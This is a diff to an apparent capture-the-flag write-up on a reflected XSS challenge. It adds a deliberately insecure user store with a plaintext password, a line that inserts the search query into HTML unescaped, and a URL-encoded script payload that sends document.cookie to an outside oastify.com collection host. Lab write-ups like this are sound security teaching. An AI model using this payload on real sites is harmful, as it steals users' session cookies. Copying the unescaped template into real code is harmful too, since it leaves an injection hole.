@@ -225,6 +225,21 @@ app.listen(80, () => {
 ---
 
 
+```javascript
+// Insecure in-memory users database, only for XSS challenge purposes
+const users = {
+    alice: { username: 'alice', password: 'pass', bio: 'Hi, I am Alice!' },
+    bob: { username: 'bob', password: process.env.BOB_PASS, bio: 'Hello from Bob!' }
+};
+```
+
+
+```ruby
+alice : pass
+```
+
+----
+
 
 ```javascript
 let html = `<h2>Search Results for "${query}"</h2>`;
@@ -237,13 +252,17 @@ let html = `<h2>Search Results for "${query}"</h2>`;
 
 ---
 
+<img width="1847" height="707" alt="image" src="https://github.com/user-attachments/assets/f8970475-718a-4757-be18-ef4c04be9e39" />
 
 
 
+```url
+http://localhost/search?query=%3Cscript%3Evar%20i%3Dnew%20Image%28%29%3Bi.src%3D%22http%3A%2F%2Fj3nztlrfmpkyc2gtlbapa5dho8uzip6e.oastify.com%2F%3F%22%2Bdocument.cookie%3B%3C%2Fscript%3E
+```
 
 
 
-
+<img width="1170" height="618" alt="image" src="https://github.com/user-attachments/assets/70da2ba1-0c55-4242-85b5-f48221aecd45" />
 
 
 
